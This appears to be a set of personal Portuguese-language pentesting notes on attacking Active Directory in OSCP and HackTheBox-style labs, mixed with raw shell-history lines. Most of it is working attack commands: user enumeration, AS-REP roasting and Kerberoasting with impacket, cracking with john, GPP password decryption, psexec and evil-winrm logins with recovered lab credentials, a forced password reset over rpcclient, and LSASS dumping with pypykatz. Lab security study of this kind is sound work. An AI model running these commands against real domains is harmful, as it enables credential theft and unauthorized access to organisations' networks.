Active Directory
========================

Sumário

[Conceitos](Active%20Directory.md#Conceitos)
[Enumeration](Active%20Directory.md#Enumeration)
## Conceitos

Domain controller é o servidor Active Directory Domain Services. (Serviço do AD)

## 1 - Searching for domain name

#### linux

    enum4linux <ip>

#### windows

    [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    
    whoami

### Searching for Domain Controller

#### linux 
    
    nslookup -type=srv _ldap._tcp.dc._msdcs.redecorp.br
    nslookup -type=srv _kerberos._tcp.EXMAPLE.COM
    nslookup -type=srv _kpasswd._tcp.EXAMPLE.COM
    nslookup -type=srv _ldap._tcp.EXAMPLE.COM
    nslookup -type=srv _ldap._tcp.dc._msdcs.EXAMPLE.COM


#### windows

    nslookup
    set type=all
    _ldap._tcp.dc._msdcs.redecorp.br

    nltest /dclist:oscp.exam

Outra opção seria:

        nltest /dclist:domainname

*Vale considerar que este comando só funciona se a máquina já está no domínio*


## 2 - Enumeration

### Remote
Primeiro temos que enumerar usuários via kerberos ou considerar a enumeração via enum4linux, rpcclient e afins:


    kerbrute userenum -d intelligence.htb --dc <ip> users.txt

### Enum4linux

    enum4linux -a -A <ip>

### RPC

Geralmente aqui conseguimos algum tipo de acesso via RPN Null session ou coisa assim:

    rpcclient -N -U '' <ip>

    srvinfo
    querydominfo
    enumdomusers
    enumdomgroups
    querygroup 0x200

    netshareenum
    netshareenumall

![qownnotes-media-xUjEhj](../../media/qownnotes-media-xUjEhj.png)

### locally

     net user
     net user /domain
     
     net user username /domain




## Get hashes
     
     impacket-GetNPUsers -dc-ip 192.168.175.202 lab.local/ -usersfile users.txt -format john -outputfile hashes
     john --wordlist=/usr/share/wordlists/rockyou.txt hahses
     
      grep --color=auto -rnw * -ie "PASSWORD" --color=always 2> /dev/null

    ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" L4mpje@bastion.htb


    wget https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe

 1976  wget https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
 1977  impacket-smbserver smb .
 1983  wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe
 1984  wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1
 1985  ls
 1986  impacket-smbserver smb .
 1987  ls
 1988  open .
 1989  locate mimikatz
 1992  cp /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/oscp/lab/3_exploitation/10_11_1_123/mimikatz .
 1993  cp -r /home/kali/ownCloud/owncloud/Area_de_trabalho/estudos/oscp/lab/3_exploitation/10_11_1_123/mimikatz .

     smbmap -H 10.129.205.44 -u '' -p ''

     smbclient -U '' -N //10.129.205.44/Replication

    active.htb/
    ls
    cd MACHINE/Preferences/Groups/
    cat Groups.xml 
    gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
    
    ##########################
    ## Nao funcionou         #
    ## Sem permissao         #
    ##########################
    impacket-psexec active.htb\svc_tgs:GPPstillStandingStrong2k18@10.129.205.44
    impacket-psexec active.htb\svc_tgs@10.129.205.44
    impacket-psexec active.htb\SVC_TGS@10.129.205.44
    evil-winrm active.htb\SVC_TGS@10.129.205.44
    
    ## Aqui funcionou
    
    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.205.44 -request
    vi hash.txt
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
    impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.205.44


   
 2021  smbmap -H 10.129.245.180 -u '' -p ''

 2024  impacket-GetNPUsers blackfield.local/audit2020 -dc-ip 10.129.245.180 -format john -no-pass
 2025  impacket-GetNPUsers blackfield.local/support -dc-ip 10.129.245.180 -format john -no-pass
 
 2033  john --wordlist=/usr/share/wordlists/rockyout.txt hash.txt 
 2034  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
 
    evil-winrm -i 10.129.245.180 -u support -p '#00^BlackKnight'

    smbclient -L 10.129.245.180 -U 'balckfield.local/support' --password '#00^BlackKnight'

    smbmap -u support -p '#00^BlackKnight' -d 'blackfield.local' -H 10.129.245.180

    rpcclient -c enumdomusers 10.10.204.197 -U 'THM-AD/svc-admin' --password 'management2005'

    rpcclient -U 'blackfield/support' --password '#00^BlackKnight' 10.129.245.180
    setuserinfo2 audit2020 23 'R3dT3@m'
    
    smbclient -U 'blackfield/audit2020' --password 'R3dT3@m' -L 10.129.245.180
    
    pypykatz lsa minidump lsass.DMP
    
    crackmapexec smb 10.129.245.180 -u support -H <hashes>
    
    crackmapexec winrm 10.129.245.180 -u svc_backup -H <hash>